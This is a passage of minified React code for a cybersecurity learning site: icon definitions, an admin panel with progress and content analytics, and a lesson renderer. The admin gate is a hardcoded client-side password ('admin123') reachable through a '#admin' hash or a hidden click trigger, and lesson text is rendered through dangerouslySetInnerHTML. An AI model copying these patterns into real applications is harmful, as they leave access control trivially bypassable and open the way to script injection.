2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]],Ki=de("lightbulb",a0);const n0=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],i0=de("lock",n0);const u0=[["path",{d:"M14.106 5.553a2 2 0 0 0 1.788 0l3.659-1.83A1 1 0 0 1 21 4.619v12.764a1 1 0 0 1-.553.894l-4.553 2.277a2 2 0 0 1-1.788 0l-4.212-2.106a2 2 0 0 0-1.788 0l-3.659 1.83A1 1 0 0 1 3 19.381V6.618a1 1 0 0 1 .553-.894l4.553-2.277a2 2 0 0 1 1.788 0z",key:"169xi5"}],["path",{d:"M15 5.764v15",key:"1pn4in"}],["path",{d:"M9 3.236v15",key:"1uimfh"}]],Gd=de("map",u0);const c0=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],s0=de("menu",c0);const o0=[["path",{d:"M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z",key:"18887p"}]],Xd=de("message-square",o0);const f0=[["path",{d:"M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",key:"10ikf1"}]],r0=de("play",f0);const d0=[["path",{d:"M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",key:"1i5ecw"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],h0=de("settings",d0);const m0=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Ji=de("shield",m0);const y0=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]],p0=de("target",y0);const g0=[["path",{d:"M10 11v6",key:"nco0om"}],["path",{d:"M14 11v6",key:"outv1u"}],["path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",key:"miytrc"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",key:"e791ji"}]],v0=de("trash-2",g0);const S0=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],En=de("triangle-alert",S0);const b0=[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["path",{d:"M16 3.128a4 4 0 0 1 0 7.744",key:"16gr8j"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}]],Qd=de("users",b0);const x0=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],Ts=de("x",x0),T0="admin123",Zi=j=>{const X=j.split(/\s+/).filter(Te=>Te.length>0).length,K=(j.match(/```[\s\S]*?```/g)||[]).length,h=(j.match(/<tip>[\s\S]*?<\/tip>/g)||[]).length,U=(j.match(/<warning>[\s\S]*?<\/warning>/g)||[]).length,J=(j.match(/\|.*\|.*\n\|[-\s|]+\|/g)||[]).length,ce=(j.match(/^##+ .+$/gm)||[]).length;return{wordCount:X,codeBlocks:K,tips:h,warnings:U,tables:J,headers:ce}},A0=j=>{const X=j.match(/(\d+)/);return X?parseInt(X[1]):0};function N0({courseData:j,isOpen:X,onClose:K}){const[h,U]=Ae.useState(!1),[J,ce]=Ae.useState(""),[Te,k]=Ae.useState(""),[x,ae]=Ae.useState("dashboard"),[q,he]=Ae.useState({}),[ge,ke]=Ae.useState(null),[_e,Fe]=Ae.useState(!1),[me,Pe]=Ae.useState([]);Ae.useEffect(()=>{const N=localStorage.getItem("cybersecurity-progress");N&&Pe(JSON.parse(N))},[X]);const C=Ae.useMemo(()=>{const N=j.chapters,L=N.flatMap(Q=>Q.lessons),Z=L.length,D=L.reduce((Q,I)=>Q+A0(I.duration),0);let g=0,E=0,Y=0,$=0,ne=[],r=[],A=[];const z=L.map(Q=>{const I=Zi(Q.content);return g+=I.wordCount,E+=I.codeBlocks,Y+=I.tips,$+=I.warnings,I.wordCount<200&&ne.push(Q),I.codeBlocks===0&&r.push(Q),I.tips===0&&A.push(Q),{...Q,...I}}),H=Z>0?Math.round(me.length/Z*100):0,W=N.map(Q=>{const Le=Q.lessons.map(Ne=>Ne.id).filter(Ne=>me.includes(Ne)).length;return{...Q,completed:Le,total:Q.lessons.length,percent:Q.lessons.length>0?Math.round(Le/Q.lessons.length*100):0}});return{totalChapters:N.length,totalLessons:Z,totalDuration:D,totalWordCount:g,totalCodeBlocks:E,totalTips:Y,totalWarnings:$,avgWordCount:Math.round(g/Z),completedCount:me.length,completionPercent:H,shortLessons:ne,noCodeLessons:r,noTipLessons:A,lessonStats:z,chapterProgress:W}},[j,me]),Ge=Ae.useMemo(()=>{const N=localStorage.getItem("cybersecurity-last-accessed");return N?new Date(parseInt(N)).toLocaleString():"Never"},[X]),B=N=>{N.preventDefault(),J===T0?(U(!0),k("")):(k("Incorrect password"),ce(""))},w=N=>{he(L=>({...L,[N]:!L[N]}))},O=()=>{confirm("Are you sure you want to reset all progress? This cannot be undone.")&&(localStorage.removeItem("cybersecurity-progress"),localStorage.removeItem("cybersecurity-last-accessed"),Pe([]))},_=()=>{const N={exportDate:new Date().toISOString(),completedLessons:me,lastAccessed:Ge,completionPercent:C.completionPercent,chapterProgress:C.chapterProgress.map(g=>({id:g.id,title:g.title,completed:g.completed,total:g.total,percent:g.percent}))},L=new Blob([JSON.stringify(N,null,2)],{type:"application/json"}),Z=URL.createObjectURL(L),D=document.createElement("a");D.href=Z,D.download=`cybersecurity-progress-${new Date().toISOString().split("T")[0]}.json`,D.click(),URL.revokeObjectURL(Z)},Xe=()=>{ge&&navigator.clipboard.writeText(ge.content)},ct=N=>{const L=N.trim().split(`
`),Z=[];let D=0,g=!1,E=[],Y="";for(;D<L.length;){const $=L[D];if($.startsWith("```")){g?(Z.push(c.jsxs("div",{className:"admin-code-block",children:[c.jsx("div",{className:"admin-code-header",children:c.jsx("span",{children:Y})}),c.jsx("pre",{children:E.join(`
`)})]},`code-${D}`)),g=!1):(g=!0,Y=$.slice(3).trim()||"text",E=[]),D++;continue}if(g){E.push($),D++;continue}if($.includes("<tip>")){let ne=[];for(D++;D<L.length&&!L[D].includes("</tip>");)ne.push(L[D]),D++;Z.push(c.jsxs("div",{className:"admin-tip-box",children:[c.jsx(Ki,{size:16}),c.jsx("span",{children:ne.join(" ").replace("💡 ","")})]},`tip-${D}`)),D++;continue}if($.includes("<warning>")){let ne=[];for(D++;D<L.length&&!L[D].includes("</warning>");)ne.push(L[D]),D++;Z.push(c.jsxs("div",{className:"admin-warning-box",children:[c.jsx(En,{size:16}),c.jsx("span",{children:ne.join(" ").replace("⚠️ ","")})]},`warn-${D}`)),D++;continue}if($.startsWith("## ")){Z.push(c.jsx("h2",{children:$.slice(3)},`h2-${D}`)),D++;continue}if($.startsWith("### ")){Z.push(c.jsx("h3",{children:$.slice(4)},`h3-${D}`)),D++;continue}$.trim()&&Z.push(c.jsx("p",{dangerouslySetInnerHTML:{__html:$.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,"<code>$1</code>")}},`p-${D}`)),D++}return Z};if(!X)return null;if(!h)return c.jsx("div",{className:"admin-overlay",children:c.jsxs("div",{className:"admin-login-card",children:[c.jsxs("div",{className:"admin-login-header",children:[c.jsx("div",{className:"admin-login-icon",children:c.jsx(i0,{size:32})}),c.jsx("h2",{children:"Admin Access"}),c.jsx("p",{children:"Enter password to continue"})]}),c.jsxs("form",{onSubmit:B,children:[c.jsx("input",{type:"password",value:J,onChange:N=>ce(N.target.value),placeholder:"Enter password",className:"admin-password-input",autoFocus:!0}),Te&&c.jsxs("div",{className:"admin-password-error",children:[c.jsx(Ly,{size:14}),Te]}),c.jsxs("button",{type:"submit",className:"admin-login-btn",children:[c.jsx(Ji,{size:18}),"Access Admin Panel"]})]}),c.jsx("button",{className:"admin-close-btn",onClick:K,children:c.jsx(Ts,{size:20})})]})});const $e=[{id:"dashboard",label:"Dashboard",icon:qd},{id:"content",label:"Content",icon:Vi},{id:"progress",label:"Progress",icon:Qd},{id:"analytics",label:"Analytics",icon:Bd},{id:"editor",label:"Preview",icon:Ss},{id:"structure",label:"Structure",icon:Gd}];return c.jsx("div",{className:"admin-overlay",children:c.jsxs("div",{className:"admin-container",children:[c.jsxs("div",{className:"admin-header",children:[c.jsxs("div",{className:"admin-header-title",children:[c.jsx(Ji,{size:24}),c.jsx("span",{children:"Admin Panel"})]}),c.jsx("button",{className:"admin-close-btn",onClick:K,children:c.jsx(Ts,{size:24})})]}),c.jsx("div",{className:"admin-tabs",children:$e.map(N=>c.jsxs("button",{className:`admin-tab ${x===N.id?"active":""}`,onClick:()=>ae(N.id),title:N.label,children:[c.jsx(N.icon,{size:18}),c.jsx("span",{className:"tab-text",children:N.label})]},N.id))}),c.jsxs("div",{className:"admin-content",children:[x==="dashboard"&&c.jsxs("div",{className:"admin-dashboard",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(qd,{size:20}),c.jsx("span",{children:"Dashboard Overview"})]}),c.jsxs("div",{className:"admin-stats-grid",children:[c.jsxs("div",{className:"admin-stat-card",children:[c.jsx("div",{className:"admin-stat-icon chapters",children:c.jsx(Vi,{size:24})}),c.jsxs("div",{className:"admin-stat-info",children:[c.jsx("span",{className:"admin-stat-value",children:C.totalChapters}),c.jsx("span",{className:"admin-stat-label",children:"Chapters"})]})]}),c.jsxs("div",{className:"admin-stat-card",children:[c.jsx("div",{className:"admin-stat-icon lessons",children:c.jsx(bs,{size:24})}),c.jsxs("div",{className:"admin-stat-info",children:[c.jsx("span",{className:"admin-stat-value",children:C.totalLessons}),c.jsx("span",{className:"admin-stat-label",children:"Lessons"})]})]}),c.jsxs("div",{className:"admin-stat-card",children:[c.jsx("div",{className:"admin-stat-icon duration",children:c.jsx(xs,{size:24})}),c.jsxs("div",{className:"admin-stat-info",children:[c.jsx("span",{className:"admin-stat-value",children:C.totalDuration}),c.jsx("span",{className:"admin-stat-label",children:"Total Minutes"})]})]}),c.jsxs("div",{className:"admin-stat-card",children:[c.jsx("div",{className:"admin-stat-icon completion",children:c.jsx(p0,{size:24})}),c.jsxs("div",{className:"admin-stat-info",children:[c.jsxs("span",{className:"admin-stat-value",children:[C.completionPercent,"%"]}),c.jsx("span",{className:"admin-stat-label",children:"Completed"})]})]})]}),c.jsxs("div",{className:"admin-progress-section",children:[c.jsx("h3",{children:"Course Completion"}),c.jsx("div",{className:"admin-progress-bar-large",children:c.jsx("div",{className:"admin-progress-fill-large",style:{width:`${C.completionPercent}%`},children:c.jsxs("span",{children:[C.completedCount,"/",C.totalLessons," lessons"]})})})]}),c.jsxs("div",{className:"admin-quick-stats",children:[c.jsxs("div",{className:"admin-quick-stat",children:[c.jsx(Wy,{size:18}),c.jsxs("span",{children:[C.totalCodeBlocks," code blocks"]})]}),c.jsxs("div",{className:"admin-quick-stat",children:[c.jsx(Ki,{size:18}),c.jsxs("span",{children:[C.totalTips," tips"]})]}),c.jsxs("div",{className:"admin-quick-stat",children:[c.jsx(En,{size:18}),c.jsxs("span",{children:[C.totalWarnings," warnings"]})]}),c.jsxs("div",{className:"admin-quick-stat",children:[c.jsx(Xd,{size:18}),c.jsxs("span",{children:[C.totalWordCount.toLocaleString()," words"]})]})]}),c.jsxs("div",{className:"admin-last-accessed",children:[c.jsx(xs,{size:16}),c.jsxs("span",{children:["Last accessed: ",Ge]})]})]}),x==="content"&&c.jsxs("div",{className:"admin-content-manager",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(Vi,{size:20}),c.jsx("span",{children:"Content Manager"})]}),c.jsx("div",{className:"admin-tree-container",children:j.chapters.map(N=>c.jsxs("div",{className:"admin-tree-chapter",children:[c.jsxs("div",{className:"admin-tree-chapter-header",onClick:()=>w(N.id),children:[q[N.id]?c.jsx(Ld,{size:18}):c.jsx(jn,{size:18}),c.jsx(Vi,{size:18}),c.jsxs("span",{className:"admin-tree-chapter-title",children:["Chapter ",N.id,": ",N.title]}),c.jsxs("span",{className:"admin-tree-lesson-count",children:[N.lessons.length," lessons"]})]}),q[N.id]&&c.jsx("div",{className:"admin-tree-lessons",children:N.lessons.map(L=>{const Z=Zi(L.content),D=Z.wordCount<200,g=me.includes(L.id);return c.jsxs("div",{className:`admin-tree-lesson ${D?"short":""} ${ge?.id===L.id?"selected":""}`,onClick:()=>ke(L),children:[c.jsxs("div",{className:"admin-tree-lesson-info",children:[g?c.jsx(jl,{size:16,className:"completed"}):c.jsx(bs,{size:16}),c.jsx("span",{className:"admin-tree-lesson-title",children:L.title})]}),c.jsxs("div",{className:"admin-tree-lesson-meta",children:[c.jsx("span",{className:"admin-tree-lesson-id",children:L.id}),c.jsx("span",{className:"admin-tree-lesson-duration",children:L.duration}),c.jsxs("span",{className:`admin-tree-lesson-words ${D?"warning":""}`,children:[Z.wordCount," words"]})]})]},L.id)})})]},N.id))}),C.shortLessons.length>0&&c.jsxs("div",{className:"admin-quality-alerts",children:[c.jsxs("h4",{children:[c.jsx(En,{size:16}),"Content Quality Alerts"]}),C.shortLessons.length>0&&c.jsx("div",{className:"admin-alert-item warning",children:c.jsxs("span",{children:[C.shortLessons.length," lessons have <200 words"]})})]})]}),x==="progress"&&c.jsxs("div",{className:"admin-progress-tracker",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(Qd,{size:20}),c.jsx("span",{children:"Student Progress Tracker"})]}),c.jsx("div",{className:"admin-overall-progress",children:c.jsxs("div",{className:"admin-progress-circle",children:[c.jsxs("svg",{viewBox:"0 0 100 100",children:[c.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"rgba(239, 68, 68, 0.2)",strokeWidth:"8"}),c.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"#ef4444",strokeWidth:"8",strokeDasharray:`${C.completionPercent*2.83} 283`,strokeLinecap:"round",transform:"rotate(-90 50 50)"})]}),c.jsxs("div",{className:"admin-progress-circle-text",children:[c.jsxs("span",{className:"percent",children:[C.completionPercent,"%"]}),c.jsx("span",{className:"label",children:"Complete"})]})]})}),c.jsxs("div",{className:"admin-chapter-progress",children:[c.jsx("h4",{children:"Progress by Chapter"}),C.chapterProgress.map(N=>c.jsxs("div",{className:"admin-chapter-progress-item",children:[c.jsxs("div",{className:"admin-chapter-progress-header",children:[c.jsxs("span",{className:"chapter-name",children:["Ch ",N.id,": ",N.title]}),c.jsxs("span",{className:"chapter-stats",children:[N.completed,"/",N.total]})]}),c.jsx("div",{className:"admin-chapter-progress-bar",children:c.jsx("div",{className:"admin-chapter-progress-fill",style:{width:`${N.percent}%`}})})]},N.id))]}),c.jsxs("div",{className:"admin-completed-lessons",children:[c.jsxs("h4",{children:["Completed Lessons (",me.length,")"]}),c.jsx("div",{className:"admin-completed-list",children:me.length===0?c.jsx("div",{className:"admin-empty-state",children:"No lessons completed yet"}):me.map(N=>{const L=j.chapters.flatMap(Z=>Z.lessons).find(Z=>Z.id===N);return L?c.jsxs("div",{className:"admin-completed-item",children:[c.jsx(jl,{size:14}),c.jsx("span",{children:L.title})]},N):null})})]}),c.jsxs("div",{className:"admin-progress-actions",children:[c.jsxs("button",{className:"admin-action-btn export",onClick:_,children:[c.jsx(Vy,{size:18}),"Export Progress"]}),c.jsxs("button",{className:"admin-action-btn reset",onClick:O,children:[c.jsx(v0,{size:18}),"Reset Progress"]})]})]}),x==="analytics"&&c.jsxs("div",{className:"admin-analytics",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(Bd,{size:20}),c.jsx("span",{children:"Course Analytics"})]}),c.jsxs("div",{className:"admin-analytics-grid",children:[c.jsxs("div",{className:"admin-analytics-card",children:[c.jsxs("div",{className:"admin-analytics-card-header",children:[c.jsx(Xd,{size:20}),c.jsx("span",{children:"Word Count"})]}),c.jsx("div",{className:"admin-analytics-card-value",children:C.totalWordCount.toLocaleString()}),c.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",C.avgWordCount," per lesson"]})]}),c.jsxs("div",{className:"admin-analytics-card",children:[c.jsxs("div",{className:"admin-analytics-card-header",children:[c.jsx(Yd,{size:20}),c.jsx("span",{children:"Code Blocks"})]}),c.jsx("div",{className:"admin-analytics-card-value",children:C.totalCodeBlocks}),c.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",(C.totalCodeBlocks/C.totalLessons).toFixed(1)," per lesson"]})]}),c.jsxs("div",{className:"admin-analytics-card",children:[c.jsxs("div",{className:"admin-analytics-card-header",children:[c.jsx(Ki,{size:20}),c.jsx("span",{children:"Pro Tips"})]}),c.jsx("div",{className:"admin-analytics-card-value",children:C.totalTips}),c.jsxs("div",{className:"admin-analytics-card-sub",children:[C.noTipLessons.length," lessons without tips"]})]}),c.jsxs("div",{className:"admin-analytics-card",children:[c.jsxs("div",{className:"admin-analytics-card-header",children:[c.jsx(En,{size:20}),c.jsx("span",{children:"Warnings"})]}),c.jsx("div",{className:"admin-analytics-card-value",children:C.totalWarnings}),c.jsx("div",{className:"admin-analytics-card-sub",children:"Security & safety notes"})]})]}),c.jsxs("div",{className:"admin-quality-breakdown",children:[c.jsx("h4",{children:"Content Quality Indicators"}),c.jsxs("div",{className:"admin-quality-item",children:[c.jsxs("div",{className:"admin-quality-label",children:[c.jsx("span",{children:"Lessons with Code Examples"}),c.jsxs("span",{children:[C.totalLessons-C.noCodeLessons.length,"/",C.totalLessons]})]}),c.jsx("div",{className:"admin-quality-bar",children:c.jsx("div",{className:"admin-quality-fill good",style:{width:`${(C.totalLessons-C.noCodeLessons.length)/C.totalLessons*100}%`}})})]}),c.jsxs("div",{className:"admin-quality-item",children:[c.jsxs("div",{className:"admin-quality-label",children:[c.jsx("span",{children:"Lessons with Pro Tips"}),c.jsxs("span",{children:[C.totalLessons-C.noTipLessons.length,"/",C.totalLessons]})]}),c.jsx("div",{className:"admin-quality-bar",children:c.jsx("div",{className:"admin-quality-fill good",style:{width:`${(C.totalLessons-C.noTipLessons.length)/C.totalLessons*100}%`}})})]}),c.jsxs("div",{className:"admin-quality-item",children:[c.jsxs("div",{className:"admin-quality-label",children:[c.jsx("span",{children:"Lessons with >200 Words"}),c.jsxs("span",{children:[C.totalLessons-C.shortLessons.length,"/",C.totalLessons]})]}),c.jsx("div",{className:"admin-quality-bar",children:c.jsx("div",{className:"admin-quality-fill good",style:{width:`${(C.totalLessons-C.shortLessons.length)/C.totalLessons*100}%`}})})]})]}),c.jsxs("div",{className:"admin-lesson-stats-table",children:[c.jsx("h4",{children:"Detailed Lesson Statistics"}),c.jsx("div",{className:"admin-table-container",children:c.jsxs("table",{children:[c.jsx("thead",{children:c.jsxs("tr",{children:[c.jsx("th",{children:"Lesson"}),c.jsx("th",{children:"Words"}),c.jsx("th",{children:"Code"}),c.jsx("th",{children:"Tips"}),c.jsx("th",{children:"Warn"})]})}),c.jsx("tbody",{children:C.lessonStats.map(N=>c.jsxs("tr",{className:N.wordCount<200?"warning-row":"",children:[c.jsx("td",{children:N.title}),c.jsx("td",{children:N.wordCount}),c.jsx("td",{children:N.codeBlocks}),c.jsx("td",{children:N.tips}),c.jsx("td",{children:N.warnings})]},N.id))})]})})]})]}),x==="editor"&&c.jsxs("div",{className:"admin-editor",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(Ss,{size:20}),c.jsx("span",{children:"Content Preview"})]}),c.jsx("div",{className:"admin-lesson-selector",children:c.jsxs("select",{value:ge?.id||"",onChange:N=>{const L=j.chapters.flatMap(Z=>Z.lessons).find(Z=>Z.id===N.target.value);ke(L)},children:[c.jsx("option",{value:"",children:"Select a lesson..."}),j.chapters.map(N=>c.jsx("optgroup",{label:`Chapter ${N.id}: ${N.title}`,children:N.lessons.map(L=>c.jsx("option",{value:L.id,children:L.title},L.id))},N.id))]})}),ge&&c.jsxs(c.Fragment,{children:[c.jsxs("div",{className:"admin-view-toggle",children:[c.jsxs("button",{className:`toggle-btn ${_e?"":"active"}`,onClick:()=>Fe(!1),children:[c.jsx(Ky,{size:16}),"Rendered"]}),c.jsxs("button",{className:`toggle-btn ${_e?"active":""}`,onClick:()=>Fe(!0),children:[c.jsx(Yd,{size:16}),"Raw"]}),c.jsxs("button",{className:"copy-btn",onClick:Xe,children:[c.jsx(Xy,{size:16}),"Copy"]})]}),c.jsxs("div",{className:"admin-lesson-meta",children:[c.jsxs("span",{children:[c.jsx("strong",{children:"ID:"})," ",ge.id]}),c.jsxs("span",{children:[c.jsx("strong",{children:"Duration:"})," ",ge.duration]}),c.jsxs("span",{children:[c.jsx("strong",{children:"Words:"})," ",Zi(ge.content).wordCount]})]}),c.jsx("div",{className:"admin-preview-container",children:_e?c.jsx("pre",{className:"admin-raw-content",children:ge.content}):c.jsxs("div",{className:"admin-rendered-content",children:[c.jsx("h1",{children:ge.title}),ct(ge.content)]})})]}),!ge&&c.jsxs("div",{className:"admin-empty-state",children:[c.jsx(Ss,{size:48}),c.jsx("p",{children:"Select a lesson to preview its content"})]})]}),x==="structure"&&c.jsxs("div",{className:"admin-structure",children:[c.jsxs("div",{className:"admin-section-title",children:[c.jsx(Gd,{size:20}),c.jsx("span",{children:"Course Structure"})]}),c.jsxs("div",{className:"admin-structure-legend",children:[c.jsxs("div",{className:"legend-item",children:[c.jsx("div",{className:"legend-color completed"}),c.jsx("span",{children:"Completed"})]}),c.jsxs("div",{className:"legend-item",children:[c.jsx("div",{className:"legend-color incomplete"}),c.jsx("span",{children:"Not Started"})]}),c.jsxs("div",{className:"legend-item",children:[c.jsx("div",{className:"legend-color warning"}),c.jsx("span",{children:"Short Content"})]})]}),c.jsxs("div",{className:"admin-structure-map",children:[j.chapters.map((N,L)=>c.jsxs("div",{className:"admin-structure-chapter",children:[c.jsxs("div",{className:"admin-structure-chapter-node",children:[c.jsx("div",{className:"chapter-badge",children:N.id}),c.jsxs("div",{className:"chapter-info",children:[c.jsx("span",{className:"chapter-title",children:N.title}),c.jsx("span",{className:"chapter-desc",children:N.description})]})]}),c.jsx("div",{className:"admin-structure-lessons",children:N.lessons.map((Z,D)=>{const g=me.includes(Z.id),E=Zi(Z.content).wordCount<200;return c.jsxs("div",{className:`admin-structure-lesson-node ${g?"completed":""} ${E?"warning":""}`,children:[c.jsxs("div",{className:"lesson-connector",children:[c.jsx("div",{className:"connector-line"}),c.jsx("div",{className:"connector-dot"})]}),c.jsxs("div",{className:"lesson-card",children:[c.jsx("div",{className:"lesson-status",children:g?c.jsx(jl,{size:16}):c.jsx("div",{className:"lesson-number",children:D+1})}),c.jsxs("div",{className:"lesson-info",children:[c.jsx("span",{className:"lesson-title",children:Z.title}),c.jsx("span",{className:"lesson-duration",children:Z.duration})]})]})]},Z.id)})}),L<j.chapters.length-1&&c.jsx("div",{className:"chapter-connector",children:c.jsx(Ld,{size:24})})]},N.id)),c.jsxs("div",{className:"admin-structure-finish",children:[c.jsx(Dy,{size:32}),c.jsx("span",{children:"Course Complete!"})]})]})]})]})]})})}const Vd={1:{src:"/infographics/ch1-what-is-cybersecurity.jpg",alt:"What is Cybersecurity - CIA Triad & Internet Basics"},2:{src:"/infographics/ch2-passwords-authentication.jpg",alt:"Passwords & Authentication - Cracking, Rainbow Tables, 2FA"},3:{src:"/infographics/ch3-social-engineering.jpg",alt:"Social Engineering - Phishing, Vishing, Baiting, Pretexting"},4:{src:"/infographics/ch4-encryption-cryptography.jpg",alt:"Encryption & Cryptography - Symmetric, Asymmetric, HTTPS, Hashing"},5:{src:"/infographics/ch5-network-security.jpg",alt:"Network Security - Scanning, Firewalls, IDS/IPS"},6:{src:"/infographics/ch6-web-vulnerabilities.jpg",alt:"Web Vulnerabilities - SQL Injection, XSS, CSRF"},7:{src:"/infographics/ch7-ethical-hacking-tools.jpg",alt:"Ethical Hacking Toolkit - Nmap, Metasploit, Burp Suite"},8:{src:"/infographics/ch8-capture-the-flag.jpg",alt:"Capture The Flag - CTF Categories & Platforms"}};function j0(){const[j,X]=Ae.useState(!1),[K,h]=Ae.useState("home"),[U,J]=Ae.useState(null),[ce,Te]=Ae.useState([]),[k,x]=Ae.useState(!1),[ae,q]=Ae.useState(0),he=Ae.useRef(null);Ae.useEffect(()=>{const B=localStorage.getItem("cybersecurity-progress");B&&Te(JSON.parse(B)),window.location.hash==="#admin"&&x(!0)},[]),Ae.useEffect(()=>{localStorage.setItem("cybersecurity-last-accessed",Date.now().toString())},[K,U]);const ge=()=>{q(B=>B+1),he.current&&clearTimeout(he.current),he.current=setTimeout(()=>{q(0)},2e3),ae>=4&&(x(!0),q(0))},ke=B=>{const w=[...ce,B];Te(w),localStorage.setItem("cybersecurity-progress",JSON.stringify(w))},_e=Ct.chapters.reduce((B,w)=>B+w.lessons.length,0),Fe=Math.round(ce.length/_e*100),me=B=>{J(B),h("lesson"),X(!1),window.scrollTo(0,0)},Pe=()=>{if(!U)return null;for(let B=0;B<Ct.chapters.length;B++){const w=Ct.chapters[B];for(let O=0;O<w.lessons.length;O++)if(w.lessons[O].id===U.id){if(O<w.lessons.length-1)return w.lessons[O+1];if(B<Ct.chapters.length-1)return Ct.chapters[B+1].lessons[0]}}return null},C=()=>{if(!U)return null;for(let B=0;B<Ct.chapters.length;B++){const w=Ct.chapters[B];for(let O=0;O<w.lessons.length;O++)if(w.lessons[O].id===U.id){if(O>0)return w.lessons[O-1];if(B>0){const _=Ct.chapters[B-1];return _.lessons[_.lessons.length-1]}}}return null},Ge=B=>{const w=B.trim().split(`
`),O=[];let _=0,Xe=!1,ct=[],$e="";for(;_<w.length;){const N=w[_];if(N.startsWith("```")){Xe?(O.push(c.jsxs("div",{className:"code-block",children:[c.jsxs("div",{className:"code-header",children:[c.jsx("span",{className:"code-language",children:$e}),c.jsx("button",{className:"code-copy",onClick:()=>navigator.clipboard.writeText(ct.join(`
`)),children:"Copy"})]}),c.jsx("div",{className:"code-content",children:c.jsx("pre",{children:ct.join(`
`)})})]},`code-${_}`)),Xe=!1):(Xe=!0,$e=N.slice(3).trim()||"text",ct=[]),_++;continue}if(Xe){ct.push(N),_++;continue}if(N.includes("<tip>")){let L=[];for(_++;_<w.length&&!w[_].includes("</tip>");)L.push(w[_]),_++;O.push(c.jsxs("div",{className:"tip-box",children:[c.jsxs("div",{className:"tip-box-header",children:[c.jsx(Ki,{size:18}),c.jsx("span",{children:"Pro Tip"})]}),c.jsx("p",{children:L.join(" ").replace("💡 ","")})]},`tip-${_}`)),_++;continue}if(N.includes("<warning>")){let L=[];for(_++;_<w.length&&!w[_].includes("</warning>");)L.push(w[_]),_++;O.push(c.jsxs("div",{className:"warning-box",children:[c.jsxs("div",{className:"warning-box-header",children:[c.jsx(En,{size:18}),c.jsx("span",{children:"Warning"})]}),c.jsx("p",{children:L.join(" ").replace("⚠️ ","")})]},`warn-${_}`)),_++;continue}if(N.startsWith("## ")){O.push(c.jsx("h2",{children:N.slice(3)},`h2-${_}`)),_++;continue}if(N.startsWith("### ")){O.push(c.jsx("h3",{children:N.slice(4)},`h3-${_}`)),_++;continue}if(N.includes("|")&&w[_+1]?.includes("---")){const L=N.split("|").filter(D=>D.trim()).map(D=>D.trim());_+=2;const Z=[];for(;_<w.length&&w[_].includes("|");)Z.push(w[_].split("|").filter(D=>D.trim()).map(D=>D.trim())),_++;O.push(c.jsx("div",{style:{overflowX:"auto",margin:"20px 0"},children:c.jsxs("table",{style:{width:"100%",borderCollapse:"collapse",background:"var(--bg-card)",borderRadius:"12px",overflow:"hidden"},children:[c.jsx("thead",{children:c.jsx("tr",{children:L.map((D,g)=>c.jsx("th",{style:{padding:"12px 16px",textAlign:"left",borderBottom:"1px solid var(--border-color)",color:"var(--accent-red)"},children:D},g))})}),c.jsx("tbody",{children:Z.map((D,g)=>c.jsx("tr",{children:D.map((E,Y)=>c.jsx("td",{style:{padding:"12px 16px",borderBottom:"1px solid var(--border-color)",color:"var(--text-secondary)"},children:c.jsx("span",{dangerouslySetInnerHTML:{__html:E.replace(/\*\*(.*?)\*\*/g,'<strong style="color:var(--text-primary)">$1</strong>').replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-size:13px">$1</code>')}})},Y))},g))})]})},`table-${_}`));continue}if(N.startsWith("- ")||N.startsWith("* ")){const L=[];for(;_<w.length&&(w[_].startsWith("- ")||w[_].startsWith("* 